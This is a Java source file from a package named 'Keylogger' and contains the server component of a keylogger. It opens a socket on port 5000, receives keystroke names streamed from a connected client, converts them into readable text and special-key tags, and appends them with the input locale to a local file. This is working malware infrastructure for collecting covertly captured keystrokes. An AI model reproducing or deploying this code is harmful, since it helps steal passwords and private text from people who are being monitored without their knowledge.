package Keylogger;

import java.awt.im.InputContext;
import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Arrays;

public class Server {
    String[] keys = {"alt", "tab", "shift", "escape", "backspace", "caps lock", "ctrl", "Win", "backslash", "up", "down", "right", "left"};

    public static void main(String[] args) {
        new Server().connect();
    }

    public static String reformationOfHotKeys(String message) {
        switch (message) {
            case "enter":
                message = "\n";
                break;
            case "space":
                message = " ";
                break;
            case "slash":
                message = "/";
                break;
            case "comma":
                message = ",";
                break;
            case "meta":
                message = "Win";
                break;
            case "back slash":
                message = "backslash";
                break;
            case "quote":
                message = "'";
                break;
            case "open bracket":
                message = "[";
                break;
            case "close bracket":
                message = "]";
                break;
            case "semicolon":
                message = ";";
                break;
            case "period":
                message = ".";
                break;
            case "back quote":
                message = "`";
                break;
            default:
                break;
        }
        return message;
    }

    public static String spaceAppending(String message, String[] keys) {
        if (Arrays.asList(keys).contains(message)) {
            message = " [" + message + "] ";
        }
        return message;
    }

    public static void clearTheFile() throws IOException {
        FileWriter file = new FileWriter("test.txt", false);
        PrintWriter rewrite = new PrintWriter(file, false);

        rewrite.flush();
        rewrite.close();

        file.close();
    }

    public void connect() {
        try {
            ServerSocket serverSocket = new ServerSocket(5000);
            System.out.println("Server started, waiting for connections");

            clearTheFile();

            while (true) {
                Socket socket = serverSocket.accept();

                System.out.println(socket.getLocalAddress() + " is connecting ... ");
                System.out.println("---------------------------------------------------");
                System.out.println("SUCCESSFUL CONNECTION");

                InputStreamReader stream = new InputStreamReader(socket.getInputStream());
                BufferedReader reader = new BufferedReader(stream);

                InputContext context = InputContext.getInstance();

                String language = context.getLocale().toString();

                try (FileWriter wr = new FileWriter("test.txt", true)) {
                    wr.write(language + ": ");
                } catch (IOException e) {
                    System.out.println("Произошла языковая ошибка");
                }

                while (true) {
                    String message = reader.readLine();

                    try (FileWriter writer = new FileWriter("test.txt", true)) {
                        message = reformationOfHotKeys(message);
                        message = spaceAppending(message, keys);

                        writer.write(message);
                        writer.flush();
                    } catch (IOException ex) {
                        System.out.println(ex.getMessage());
                    }
                }
            }
        } catch (IOException ex) {
            System.out.println(ex.getMessage());
        }
    }
}